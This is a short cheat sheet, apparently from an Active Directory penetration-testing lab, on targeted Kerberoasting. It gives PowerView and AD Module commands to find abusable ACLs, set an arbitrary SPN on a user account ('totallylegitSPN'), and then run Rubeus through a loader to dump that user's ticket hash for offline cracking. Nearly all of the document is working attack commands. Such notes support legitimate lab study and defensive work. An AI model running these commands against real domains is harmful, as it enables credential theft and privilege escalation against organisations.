**THE DEFINITION OF A SERVICE ACCOUNT IS ANY USER THAT HAS A SPN SET (NONE NULL)**

With enough rights (`GenericAll`/`GenericWrite`), a target user's SPN can
be set to anything (unique in the domain).

We can then request a TGS without special privileges. The TGS can then
be "Kerberoasted".

---
Find possible ACLs to abuse
```powershell
Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "RDPUsers"}
```

Check if the user has an SPN set (PowerView + AD Module)
```powershell
Get-DomainUser -Identity Support548User | select serviceprincipalname

Get-ADUser -Identity Support548User -Properties ServicePrincipalName | select ServicePrincipalName
```

Set SPN for the user - **must be unique for the forest** (PowerView + AD Module)
```powershell
Set-DomainObject -Identity Support548User -Set @{serviceprincipalname='dcorp/totallylegitSPN'} -verbose

Set-ADUser -Identity Support548User -ServicePrincipalNames
@{Add='dcorp/whatever1'}
```

Kerberoast
```powershell
.\Loader.exe -path .\Rubeus.exe -args kerberoast /user:Support548User /simple /rc4opsec /outfile:Support548User.hash
```